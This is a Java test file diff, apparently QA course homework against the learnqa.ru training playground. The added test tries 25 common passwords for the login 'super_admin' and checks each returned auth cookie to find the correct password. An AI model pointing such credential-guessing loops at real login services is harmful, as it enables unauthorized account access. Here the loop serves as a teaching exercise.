@@ -3,6 +3,11 @@ import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
 
+import java.util.Arrays;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+
 
 public class Homework2 {
     @Test
@@ -89,4 +94,61 @@ public class Homework2 {
         System.out.println("Статус после выполнения задачи: " + statusAfter);
         System.out.println("Результат: " + result);
     }
-}
+
+    @Test
+    public void testEx9() {
+                String login = "super_admin";
+                List<String> passwords = Arrays.asList(
+                        "123456", "123456789", "qwerty", "password", "1234567",
+                        "12345678", "12345", "iloveyou", "111111", "123123",
+                        "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
+                        "654321", "555555", "lovely", "7777777", "welcome",
+                        "888888", "princess", "dragon", "password1", "123qwe"
+                );
+
+                String correctPassword = null;
+                String message = null;
+
+                for (String password : passwords) {
+                    Map<String, String> data = new HashMap<>();
+                    data.put("login", login);
+                    data.put("password", password);
+
+                    Response responseForGet = RestAssured
+                            .given()
+                            .body(data)
+                            .when()
+                            .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                            .andReturn();
+
+                    String authCookie = responseForGet.getCookie("auth_cookie");
+
+                    Map<String, String> cookies = new HashMap<>();
+                    if (authCookie != null) {
+                        cookies.put("auth_cookie", authCookie);
+                    }
+
+                    Response responseForCheck = RestAssured
+                            .given()
+                            .cookies(cookies)
+                            .when()
+                            .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                            .andReturn();
+
+                    String responseText = responseForCheck.asString();
+
+                    if (!responseText.equals("You are NOT authorized")) {
+                        correctPassword = password;
+                        message = responseText;
+                        break;
+                    }
+                }
+
+                if (correctPassword != null) {
+                    System.out.println("Верный пароль: " + correctPassword);
+                    System.out.println("Сообщение: " + message);
+                } else {
+                    System.out.println("Правильного пароля нет в списке");
+                }
+            }
+        }
